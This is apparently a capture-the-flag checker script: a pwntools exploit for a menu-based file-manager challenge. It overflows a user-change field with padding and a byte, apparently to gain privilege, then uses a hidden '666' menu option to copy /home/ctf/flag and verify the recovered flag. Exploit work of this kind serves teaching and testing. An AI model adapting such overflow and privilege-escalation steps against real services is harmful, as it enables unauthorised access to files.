#!/usr/bin/python
#  -*- coding: utf-8 -*-
import re
import sys
import requests
from pwn import*

#context.log_level="debug"
# 输入为靶机 IP 和端口以及要验证的 flag
HOST = sys.argv[1]
PORT = sys.argv[2]
FLAG = sys.argv[3]

def login(p):
    p.recv()
    p.sendline("2")
    p.recv()
    p.sendline("guest")
    p.recv()
    p.sendline("1233211234567233")

def create(p,name,length,content):
    p.recvuntil("7. exit\n")
    p.sendline("1")
    p.recvuntil("input file name:")
    p.sendline(name)
    p.recv()
    p.sendline(str(length))
    p.recv()
    p.sendline(content.ljust(length,"\0"))


def delete(p,name):
    p.recvuntil("7. exit\n")
    p.sendline("2")
    p.recvuntil("name:")
    p.sendline(name)


def prints(p,name):
    p.recvuntil("6. secret\n")
    p.sendline("3")
    p.sendlineafter("input file name:",name)


def change(p,name,password):
    p.recvuntil("7. exit\n")
    p.sendline("5")
    p.recvuntil("user name:")
    p.sendline(name)
    p.recvuntil("user password:")
    p.send(password)


def secret(p,oldpath,newpath):
    p.recvuntil("6. secret\n")
    p.sendline("666")
    p.recvuntil("input old path:")
    p.sendline(oldpath)
    p.recvuntil("input new path:")
    p.sendline(newpath)


# exp 函数
def exp(ip, port):
    
    # 请求靶机
    p = remote(ip,port)
    login(p)
    create(p,"a",10,"aaaaaaaa")
    delete(p,"a")
    change(p,"zs0zrc",'a'*0x20 + "\x03")
    prints(p,"a")
    sleep(1)
    secret(p,"/home/ctf/flag","/tmp/a")

    # 匹配 FLAG
    p.recvuntil("content:")
    flag = p.recv().strip()
    print flag
    return flag


# 主逻辑
if __name__ == '__main__':
    flag = exp(HOST, PORT)
    # 比较得出的 flag 是否是想要的 flag
    assert flag == FLAG
    print("Pass!")
